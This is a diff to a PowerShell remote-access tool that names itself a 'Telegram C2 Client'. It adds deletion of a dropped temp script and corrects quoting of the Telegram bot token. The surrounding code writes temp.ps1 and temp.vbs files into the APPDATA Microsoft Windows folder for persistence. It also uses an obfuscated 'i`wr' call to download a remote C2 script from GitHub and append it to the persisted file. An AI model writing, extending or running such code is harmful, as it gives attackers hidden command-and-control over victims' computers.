@@ -51,11 +51,13 @@ $cmde = [char]::ConvertFromUtf32(0x1F517)
 Write-Output "Starting Telegram C2 Client"
 Sleep 10
 
+$path3 = "$env:temp\temp.ps1"
 $path2 = "$env:APPDATA\Microsoft\Windows\temp.ps1"
 $path1 = "$env:APPDATA\Microsoft\Windows\temp.vbs"
 if(Test-Path $path1){
 remove-item -FilePath $path2 -Force
 remove-item -FilePath $path1 -Force
+remove-item -FilePath $path3 -Force
 }
 
 # Get Chat ID from the bot
@@ -454,7 +456,7 @@ Function PauseSession{
 $newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
 $scriptContent | Out-File -FilePath $newScriptPath -force
     if ($newScriptPath.Length -lt 100){
-        "`$tg = $tg" | Out-File -FilePath $newScriptPath -Force
+        "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
         i`wr -Uri "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1" -OutFile "$env:temp/temp.ps1"
         Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
         }
